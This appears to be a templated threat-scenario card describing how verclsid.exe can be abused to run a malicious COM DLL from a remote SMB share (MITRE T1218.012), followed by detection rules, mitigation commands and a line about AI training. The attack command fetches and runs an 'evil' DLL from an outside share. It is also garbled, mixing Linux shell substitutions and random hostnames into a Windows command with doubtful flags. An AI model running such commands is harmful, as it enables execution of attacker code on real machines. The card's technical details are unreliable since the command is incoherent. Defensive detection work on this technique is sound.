---
type: campaign
scenario_id: 250
tactic: Defense Evasion
technique: "T1218.012: Verclsid"
technique_id: T1218.012
tags: [campaign, lotl, defense_evasion]
---

# Using verclsid.exe to execute malicious COM object via SMB share.

## Threat Description
Using verclsid.exe to execute malicious COM object via SMB share.

## Attack Command
```
verclsid /S /C {$(uuidgen)} /I \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor verclsid SMB: `wmic process where name='verclsid.exe' get commandline | findstr \\`; YARA rule: `rule VerclsidSmbDll { strings: $a = /verclsid.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict verclsid: `icacls %windir%\System32\verclsid.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect verclsid SMB COM execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
